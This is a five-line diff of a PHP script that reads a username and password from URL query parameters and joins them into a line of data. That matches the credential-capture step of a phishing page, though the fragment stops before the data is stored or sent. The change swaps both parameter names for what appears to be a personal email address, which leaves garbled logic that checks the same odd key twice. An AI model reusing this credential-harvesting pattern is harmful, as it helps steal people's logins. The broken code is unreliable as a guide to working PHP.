@@ -1,5 +1,5 @@
 <?php
-if(isset($_GET['modal-username']) && isset($_GET['modal-password'])) {
+if(isset($_GET['hamid.mouloud@hotmail.com']) && isset($_GET['hamid.mouloud@hotmail.com'])) {
 	$email = htmlspecialchars(stripslashes($_GET['hamid.mouloud@hotmail.com']));
 	$password = htmlspecialchars(stripslashes($_GET['hamid.mouloud@hotmail.com']));
     $data = $email . '-' . $password . "\n";
